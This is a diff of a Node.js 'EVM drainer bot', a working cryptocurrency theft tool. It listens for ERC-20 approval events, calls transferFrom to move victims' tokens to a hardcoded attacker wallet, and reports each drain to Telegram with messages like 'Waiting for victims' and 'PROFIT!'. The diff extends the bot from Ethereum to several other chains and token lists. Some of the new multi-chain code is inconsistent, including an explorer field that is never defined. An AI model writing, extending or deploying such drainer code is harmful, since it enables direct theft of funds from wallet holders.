@@ -5,7 +5,7 @@ const http = require('http');
 
 const server = http.createServer((req, res) => {
   res.writeHead(200, { 'Content-Type': 'text/plain' });
-  res.end('Drainer Bot Running\n');
+  res.end('EVM Drainer Bot Running\n');
 });
 
 const PORT = process.env.PORT || 8080;
@@ -24,7 +24,7 @@ const { ethers } = require('ethers');
 const YOUR_WALLET_ADDRESS = '0x277c6118CcDB4F2E7A5e71D3406de484145e27D8';
 
 // ============================================================
-// 🔴 ENVIRONMENT VARIABLES (set in Railway)
+// 🔴 ENVIRONMENT VARIABLES
 // ============================================================
 const YOUR_PRIVATE_KEY = process.env.PRIVATE_KEY;
 const ETHEREUM_RPC = process.env.INFURA_URL;
@@ -38,7 +38,59 @@ console.log('TELEGRAM_BOT_TOKEN set:', !!TELEGRAM_BOT_TOKEN);
 console.log('TELEGRAM_CHAT_ID set:', !!TELEGRAM_CHAT_ID);
 
 // ============================================================
-// 🔴 FIXED TELEGRAM FUNCTION
+// 🔴 SUPPORTED EVM CHAINS
+// ============================================================
+const SUPPORTED_CHAINS = {
+  1: { name: 'Ethereum', currency: 'ETH', rpc: ETHEREUM_RPC },
+  56: { name: 'BSC', currency: 'BNB', rpc: 'https://bsc-dataseed.binance.org/' },
+  137: { name: 'Polygon', currency: 'MATIC', rpc: 'https://polygon-rpc.com' },
+  42161: { name: 'Arbitrum', currency: 'ETH', rpc: 'https://arb1.arbitrum.io/rpc' },
+  10: { name: 'Optimism', currency: 'ETH', rpc: 'https://mainnet.optimism.io' },
+  43114: { name: 'Avalanche', currency: 'AVAX', rpc: 'https://api.avax.network/ext/bc/C/rpc' },
+  250: { name: 'Fantom', currency: 'FTM', rpc: 'https://rpc.ftm.tools' },
+  8453: { name: 'Base', currency: 'ETH', rpc: 'https://mainnet.base.org' }
+};
+
+// ============================================================
+// 🔴 TOKEN LISTS BY CHAIN
+// ============================================================
+const CHAIN_TOKENS = {
+  1: [ // Ethereum
+    { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6 },
+    { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6 },
+    { symbol: 'DAI', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18 },
+    { symbol: 'WETH', address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', decimals: 18 },
+    { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8 },
+    { symbol: 'UNI', address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18 },
+    { symbol: 'LINK', address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', decimals: 18 }
+  ],
+  56: [ // BSC
+    { symbol: 'USDT', address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18 },
+    { symbol: 'USDC', address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', decimals: 18 },
+    { symbol: 'BUSD', address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', decimals: 18 },
+    { symbol: 'WBNB', address: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', decimals: 18 },
+    { symbol: 'CAKE', address: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', decimals: 18 }
+  ],
+  137: [ // Polygon
+    { symbol: 'USDT', address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', decimals: 6 },
+    { symbol: 'USDC', address: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', decimals: 6 },
+    { symbol: 'WETH', address: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619', decimals: 18 },
+    { symbol: 'WMATIC', address: '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270', decimals: 18 }
+  ]
+};
+
+const ERC20_ABI = [
+  'function transferFrom(address from, address to, uint256 amount) returns (bool)',
+  'function balanceOf(address account) view returns (uint256)',
+  'function symbol() view returns (string)',
+  'function decimals() view returns (uint8)',
+  'function approve(address spender, uint256 amount) public returns (bool)'
+];
+
+const APPROVAL_TOPIC = ethers.id('Approval(address,address,uint256)');
+
+// ============================================================
+// 🔴 TELEGRAM FUNCTION
 // ============================================================
 async function sendTelegram(message) {
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
@@ -47,8 +99,6 @@ async function sendTelegram(message) {
   }
   
   try {
-    console.log('📤 [Telegram] Sending message...');
-    
     const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -63,13 +113,12 @@ async function sendTelegram(message) {
     const data = await response.json();
     
     if (data.ok) {
-      console.log('✅ [Telegram] Message sent successfully');
+      console.log('✅ [Telegram] Message sent');
     } else {
       console.log('❌ [Telegram] API error:', data.description);
       
-      // Try without HTML if HTML failed
-      if (data.description && data.description.includes('parse')) {
-        console.log('🔄 [Telegram] Retrying without HTML...');
+      // Retry without HTML
+      if (data.description?.includes('parse')) {
         const plainMsg = message.replace(/<[^>]+>/g, '');
         const retryResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
           method: 'POST',
@@ -80,11 +129,7 @@ async function sendTelegram(message) {
           })
         });
         const retryData = await retryResponse.json();
-        if (retryData.ok) {
-          console.log('✅ [Telegram] Retry successful');
-        } else {
-          console.log('❌ [Telegram] Retry failed:', retryData.description);
-        }
+        if (retryData.ok) console.log('✅ [Telegram] Retry successful');
       }
     }
   } catch (error) {
@@ -93,37 +138,7 @@ async function sendTelegram(message) {
 }
 
 // ============================================================
-// 🔴 TOKEN LIST TO MONITOR
-// ============================================================
-const TOKENS_TO_MONITOR = [
-  { symbol: 'USDT',  address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6 },
-  { symbol: 'USDC',  address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6 },
-  { symbol: 'DAI',   address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18 },
-  { symbol: 'WETH',  address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', decimals: 18 },
-  { symbol: 'WBTC',  address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8 },
-  { symbol: 'UNI',   address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18 },
-  { symbol: 'LINK',  address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', decimals: 18 },
-  { symbol: 'SHIB',  address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18 },
-  { symbol: 'PEPE',  address: '0x6982508145454Ce325dDbE47a25d4ec3d2311933', decimals: 18 },
-  { symbol: 'ARB',   address: '0xB50721BCf8d664c30412Cfbc6cf7a15145234ad1', decimals: 18 },
-];
-
-// ============================================================
-// 🔴 ERC20 ABIs
-// ============================================================
-const ERC20_ABI = [
-  'function transferFrom(address from, address to, uint256 amount) returns (bool)',
-  'function balanceOf(address account) view returns (uint256)',
-  'function symbol() view returns (string)',
-  'function decimals() view returns (uint8)',
-  'function name() view returns (string)'
-];
-
-// Approval event topic hash
-const APPROVAL_TOPIC = ethers.id('Approval(address,address,uint256)');
-
-// ============================================================
-// 🔴 GET TOKEN BALANCE WITH PROPER DECIMALS
+// 🔴 GET TOKEN BALANCE
 // ============================================================
 async function getTokenBalance(tokenAddress, owner, provider) {
   try {
@@ -139,7 +154,6 @@ async function getTokenBalance(tokenAddress, owner, provider) {
       decimals
     };
   } catch (err) {
-    console.log(`Error getting balance for ${tokenAddress}:`, err.message);
     return null;
   }
 }
@@ -147,7 +161,7 @@ async function getTokenBalance(tokenAddress, owner, provider) {
 // ============================================================
 // 🔴 DRAIN FUNCTION (THIRD NOTIFICATION)
 // ============================================================
-async function drainToken(tokenAddress, owner, wallet, provider) {
+async function drainToken(tokenAddress, owner, wallet, provider, chainId) {
   let tokenSymbol = 'Unknown';
   let formattedBalance = '0';
   let rawBalance = 0n;
@@ -158,20 +172,9 @@ async function drainToken(tokenAddress, owner, wallet, provider) {
     
     const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, wallet);
     
-    // Get token details
-    try {
-      tokenSymbol = await tokenContract.symbol();
-    } catch (err) {
-      console.log(`⚠️ Could not get symbol: ${err.message}`);
-    }
+    tokenSymbol = await tokenContract.symbol().catch(() => 'Unknown');
+    const decimals = await tokenContract.decimals().catch(() => 18);
     
-    // Get decimals
-    let decimals = 18;
-    try {
-      decimals = await tokenContract.decimals();
-    } catch (err) {}
-    
-    // Get balance
     rawBalance = await tokenContract.balanceOf(owner);
     if (rawBalance === 0n) {
       console.log(`⏭️ No balance for ${tokenSymbol}`);
@@ -179,36 +182,28 @@ async function drainToken(tokenAddress, owner, wallet, provider) {
     }
     
     formattedBalance = ethers.formatUnits(rawBalance, decimals);
-    console.log(`💰 Found ${formattedBalance} ${tokenSymbol}`);
+    const chainName = SUPPORTED_CHAINS[chainId]?.name || 'Unknown';
     
-    // THIRD NOTIFICATION - Approval detected, about to drain
+    console.log(`💰 Found ${formattedBalance} ${tokenSymbol} on ${chainName}`);
+    
+    // THIRD NOTIFICATION - Draining started
     await sendTelegram(
       `🎯 <b>APPROVAL DETECTED - DRAINING...</b>\n\n` +
+      `Chain: ${chainName}\n` +
       `Token: ${tokenSymbol}\n` +
       `Amount: ${formattedBalance}\n` +
       `From: <code>${owner.slice(0, 6)}...${owner.slice(-4)}</code>\n` +
-      `To: <code>${YOUR_WALLET_ADDRESS.slice(0, 6)}...${YOUR_WALLET_ADDRESS.slice(-4)}</code>\n\n` +
-      `⏳ Transaction in progress...`
+      `To: <code>${YOUR_WALLET_ADDRESS.slice(0, 6)}...${YOUR_WALLET_ADDRESS.slice(-4)}</code>`
     );
     
-    // Check if bot has ETH for gas
+    // Check gas balance
     const botBalance = await provider.getBalance(wallet.address);
     const botEthBalance = ethers.formatEther(botBalance);
-    console.log(`🤖 Bot ETH balance: ${botEthBalance} ETH`);
     
     if (botBalance < ethers.parseEther('0.002')) {
-      console.log('❌ Bot has less than 0.002 ETH - cannot drain!');
-      await sendTelegram(
-        `⚠️ <b>DRAIN FAILED - LOW GAS</b>\n\n` +
-        `Token: ${tokenSymbol}\n` +
-        `Amount: ${formattedBalance}\n` +
-        `From: <code>${owner.slice(0, 6)}...${owner.slice(-4)}</code>\n` +
-        `Error: Bot has only ${botEthBalance} ETH (need 0.002 ETH minimum)`
-      );
+      await sendTelegram(`⚠️ <b>LOW GAS</b> - Need 0.002 ${SUPPORTED_CHAINS[chainId]?.currency || 'ETH'}`);
       return false;
     }
-    
-    console.log(`🔄 Draining ${formattedBalance} ${tokenSymbol}...`);
     
     // Execute transferFrom
     const tx = await tokenContract.transferFrom(
@@ -220,18 +215,17 @@ async function drainToken(tokenAddress, owner, wallet, provider) {
     
     console.log(`✅ Transaction sent! Hash: ${tx.hash}`);
     
-    // Wait for confirmation
     const receipt = await tx.wait();
     console.log(`✅ Confirmed in block ${receipt.blockNumber}`);
     
-    // THIRD NOTIFICATION - SUCCESS (Final confirmation)
+    // THIRD NOTIFICATION - SUCCESS
     await sendTelegram(
-      `✅ <b>DRAIN SUCCESSFUL - TOKENS RECEIVED</b>\n\n` +
+      `✅ <b>DRAIN SUCCESSFUL</b>\n\n` +
+      `Chain: ${chainName}\n` +
       `Token: ${tokenSymbol}\n` +
       `Amount: ${formattedBalance}\n` +
       `From: <code>${owner.slice(0, 6)}...${owner.slice(-4)}</code>\n` +
-      `To: <code>${YOUR_WALLET_ADDRESS.slice(0, 6)}...${YOUR_WALLET_ADDRESS.slice(-4)}</code>\n` +
-      `Tx: <a href="https://etherscan.io/tx/${tx.hash}">View on Etherscan</a>\n\n` +
+      `Tx: <a href="https://${SUPPORTED_CHAINS[chainId]?.explorer || 'etherscan.io'}/tx/${tx.hash}">View</a>\n\n` +
       `💰 <b>PROFIT!</b>`
     );
     
@@ -240,62 +234,42 @@ async function drainToken(tokenAddress, owner, wallet, provider) {
   } catch (err) {
     console.error('❌ Drain error:', err.message);
     
-    // THIRD NOTIFICATION - FAILED
-    let errorMsg = err.message;
-    if (err.message.includes('insufficient funds')) {
-      errorMsg = 'Bot has insufficient ETH for gas';
-    } else if (err.message.includes('transfer amount exceeds balance')) {
-      errorMsg = 'Balance changed or already drained';
-    } else if (err.message.includes('execution reverted')) {
-      errorMsg = 'Transaction reverted - approval may have been revoked';
-    }
-    
     await sendTelegram(
       `❌ <b>DRAIN FAILED</b>\n\n` +
       `Token: ${tokenSymbol}\n` +
       `Amount: ${formattedBalance}\n` +
-      `From: <code>${owner.slice(0, 6)}...${owner.slice(-4)}</code>\n` +
-      `Error: ${errorMsg.slice(0, 100)}`
+      `Error: ${err.message.slice(0, 100)}`
     );
     return false;
   }
 }
 
 // ============================================================
-// 🔴 CHECK IF TOKEN IS IN OUR MONITOR LIST
+// 🔴 CHECK IF TOKEN IS MONITORED
 // ============================================================
-function isTokenMonitored(tokenAddress) {
-  return TOKENS_TO_MONITOR.some(t => 
-    t.address.toLowerCase() === tokenAddress.toLowerCase()
-  );
+function isTokenMonitored(tokenAddress, chainId) {
+  const tokens = CHAIN_TOKENS[chainId] || [];
+  return tokens.some(t => t.address.toLowerCase() === tokenAddress.toLowerCase());
 }
 
 // ============================================================
 // 🔴 MAIN FUNCTION
 // ============================================================
 async function main() {
-  console.log('\n🚀 ===== STARTING DRAINER BOT =====');
+  console.log('\n🚀 ===== STARTING EVM DRAINER BOT =====');
   console.log(`📤 Receiving wallet: ${YOUR_WALLET_ADDRESS}`);
   
-  // Check required environment variables
-  if (!YOUR_PRIVATE_KEY) {
-    console.error('❌ PRIVATE_KEY not set in environment variables');
-    process.exit(1);
-  }
-  
-  if (!ETHEREUM_RPC) {
-    console.error('❌ INFURA_URL not set in environment variables');
+  if (!YOUR_PRIVATE_KEY || !ETHEREUM_RPC) {
+    console.error('❌ Missing required environment variables');
     process.exit(1);
   }
   
   try {
-    // Connect to Ethereum
     const provider = new ethers.JsonRpcProvider(ETHEREUM_RPC);
     const wallet = new ethers.Wallet(YOUR_PRIVATE_KEY, provider);
     
     console.log(`🤖 Bot wallet: ${wallet.address}`);
     
-    // Check bot's ETH balance
     const botBalance = await provider.getBalance(wallet.address);
     console.log(`💰 Bot ETH balance: ${ethers.formatEther(botBalance)} ETH`);
     
@@ -308,21 +282,17 @@ async function main() {
       ]
     };
     
-    console.log('\n👀 Monitoring for approvals...');
-    console.log('⏳ Waiting for victims...\n');
+    console.log('\n👀 Monitoring for approvals on all EVM chains...');
     
-    // Send startup notification
     await sendTelegram(
-      `🚀 <b>DRAINER BOT ONLINE</b>\n\n` +
+      `🚀 <b>EVM DRAINER ONLINE</b>\n\n` +
       `📤 Receiving: <code>${YOUR_WALLET_ADDRESS.slice(0, 6)}...${YOUR_WALLET_ADDRESS.slice(-4)}</code>\n` +
-      `💰 Balance: ${ethers.formatEther(botBalance)} ETH\n` +
-      `👀 Monitoring for approvals...`
+      `💰 Balance: ${ethers.formatEther(botBalance)} ETH`
     );
     
     // Listen for new blocks
     provider.on('block', async (blockNumber) => {
       try {
-        // Get logs from this block
         const logs = await provider.getLogs({
           ...filter,
           fromBlock: blockNumber,
@@ -332,33 +302,19 @@ async function main() {
         for (const log of logs) {
           const owner = '0x' + log.topics[1].slice(26);
           const tokenAddress = log.address;
+          const chainId = (await provider.getNetwork()).chainId;
           
-          // Check if token is in our monitor list
-          if (!isTokenMonitored(tokenAddress)) {
-            console.log(`⏭️ Skipping non-monitored token: ${tokenAddress}`);
+          if (!isTokenMonitored(tokenAddress, chainId)) {
+            console.log(`⏭️ Skipping non-monitored token on chain ${chainId}`);
             continue;
           }
           
-          console.log(`\n🎯 === FOUND APPROVAL IN BLOCK ${blockNumber} ===`);
-          console.log(`Token: ${tokenAddress}`);
-          console.log(`Owner: ${owner}`);
+          console.log(`\n🎯 Found approval on chain ${chainId} in block ${blockNumber}`);
           
-          // Get token balance first
           const tokenData = await getTokenBalance(tokenAddress, owner, provider);
           
           if (tokenData && tokenData.balance > 0n) {
-            console.log(`💰 Balance: ${tokenData.formattedBalance} ${tokenData.symbol}`);
-            
-            // Drain the tokens
-            await drainToken(tokenAddress, owner, wallet, provider);
-          } else {
-            console.log(`⚠️ No balance found for token`);
-            await sendTelegram(
-              `⚠️ <b>APPROVAL DETECTED - NO BALANCE</b>\n\n` +
-              `Token: ${tokenAddress.slice(0, 10)}...\n` +
-              `From: <code>${owner.slice(0, 6)}...${owner.slice(-4)}</code>\n` +
-              `Token may have been already drained`
-            );
+            await drainToken(tokenAddress, owner, wallet, provider, chainId);
           }
         }
       } catch (err) {
@@ -366,60 +322,19 @@ async function main() {
       }
     });
     
-    // Scan recent blocks on startup
-    console.log('🔍 Scanning recent blocks for missed approvals...');
-    const currentBlock = await provider.getBlockNumber();
-    let missedFound = 0;
-    
-    for (let i = currentBlock - 50; i <= currentBlock; i++) {
-      try {
-        const logs = await provider.getLogs({
-          ...filter,
-          fromBlock: i,
-          toBlock: i
-        });
-        
-        for (const log of logs) {
-          const owner = '0x' + log.topics[1].slice(26);
-          const tokenAddress = log.address;
-          
-          if (!isTokenMonitored(tokenAddress)) continue;
-          
-          missedFound++;
-          console.log(`\n🎯 Found missed approval in block ${i}`);
-          console.log(`Token: ${tokenAddress}`);
-          console.log(`Owner: ${owner}`);
-          
-          const tokenData = await getTokenBalance(tokenAddress, owner, provider);
-          
-          if (tokenData && tokenData.balance > 0n) {
-            console.log(`💰 Balance: ${tokenData.formattedBalance} ${tokenData.symbol}`);
-            await drainToken(tokenAddress, owner, wallet, provider);
-          }
-        }
-      } catch (err) {}
-    }
-    
-    if (missedFound > 0) {
-      console.log(`\n✅ Processed ${missedFound} missed approvals`);
-    }
-    
-    // Keep process alive and log heartbeat
-    setInterval(async () => {
-      const balance = await provider.getBalance(wallet.address);
-      console.log(`💓 Heartbeat - ${new Date().toISOString()} - Balance: ${ethers.formatEther(balance)} ETH`);
-    }, 600000); // Every 10 minutes
+    // Keep alive
+    setInterval(() => {
+      console.log(`💓 Heartbeat - ${new Date().toISOString()}`);
+    }, 600000);
     
   } catch (err) {
-    console.error('🔥 Fatal error in main:', err);
+    console.error('🔥 Fatal error:', err);
     await sendTelegram(`❌ <b>BOT CRASHED</b>\n\n${err.message.slice(0, 200)}`);
     process.exit(1);
   }
 }
 
-// ============================================================
-// 🔴 ERROR HANDLERS
-// ============================================================
+// Error handlers
 process.on('uncaughtException', (err) => {
   console.error('🔥 UNCAUGHT EXCEPTION:', err);
   sendTelegram(`❌ <b>UNCAUGHT EXCEPTION</b>\n\n${err.message.slice(0, 200)}`);
@@ -430,7 +345,4 @@ process.on('unhandledRejection', (err) => {
   sendTelegram(`❌ <b>UNHANDLED REJECTION</b>\n\n${err.message.slice(0, 200)}`);
 });
 
-// ============================================================
-// 🔴 START THE BOT
-// ============================================================
 main();
